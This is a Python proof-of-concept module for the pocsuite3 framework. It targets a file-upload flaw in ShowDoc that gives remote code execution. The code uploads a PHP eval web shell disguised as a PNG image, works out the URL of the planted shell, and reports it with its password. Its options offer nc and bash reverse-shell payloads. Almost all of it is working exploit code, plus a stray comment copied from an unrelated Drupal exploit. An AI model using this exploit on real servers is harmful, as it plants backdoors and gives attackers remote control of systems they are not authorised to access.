from collections import OrderedDict
from urllib.parse import urljoin
from requests_toolbelt.multipart.encoder import MultipartEncoder

from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class DemoPOC(POCBase):
    vulID = 'everexp-Shoedoc'
    version = '1'
    author = ['Suzd']
    vulDate = '2020-08-25'
    createDate = ''
    updateDate = ''
    references = ['']
    name = 'Showdoc文件上传GetShell漏洞'
    appPowerLink = ''
    appName = 'Showdoc文件上传GetShell漏洞'
    appVersion = 'all'
    vulType = VUL_TYPE.CODE_EXECUTION
    #desc = ''' Drupal 在处理IN语句时，展开数组时key带入SQL语句导致SQL注入，可以添加管理员，造成信 息泄露 '''  # 漏洞简要描述
    samples = [] # 测试样列，使用POC测试成功的网站
    install_requires = []

    def _options(self):
        o = OrderedDict()
        payload = {"nc": REVERSE_PAYLOAD.NC, "bash": REVERSE_PAYLOAD.BASH, }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):
       output = Output(self)
       result = {}
       veri_url = urljoin(self.url, '/server/index.php?s=/api/page/upload')
       cmd = self.get_option("command")
       proxies = {
       "http": "http://127.0.0.1:8080",
       "https": "http://127.0.0.1:8080",
       }
       cookies = {"PHPSESSID": "ila73il0inbq5arg8e9t2l575l;"}
       m = MultipartEncoder(
           fields={
               'page_id': '457',
               'item_id': '28',
               'file': ('test.<>php', "<?php @eval($_POST['cmd']); ?>", "image/png")
           },
           boundary='----WebKitFormBoundaryd4AI72IsEHGTtdnU'
       )

       resp = requests.post(veri_url, data=m, proxies=proxies, cookies=cookies, headers={'Content-Type': m.content_type})
       if resp.status_code == 200 and "php" in resp.text:
                text = resp.text
                content = text.split('{"url":"')[1].split('server')[0]

                content1 = text.split('..')[1].split('"')[0]

                webshell = content + content1

                webshell1 = webshell.replace('\\', '')
                #webshell2 = webshell1
                req = requests.get(webshell1, proxies=proxies)
                if req.status_code == 200:
                     result['VerifyInfo'] = {}
                     result['VerifyInfo']['URL'] = self.url
                     result['ShellInfo'] = {}
                     result['ShellInfo']['URL'] = webshell1 + '   pass:cmd'

       return self.parse_output(result)


    #def _verify(self):  # 固定
      #  return self._attack()

    def parse_output(self, result):  # 固定
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('NotVulnerable')
        return output


register_poc(DemoPOC)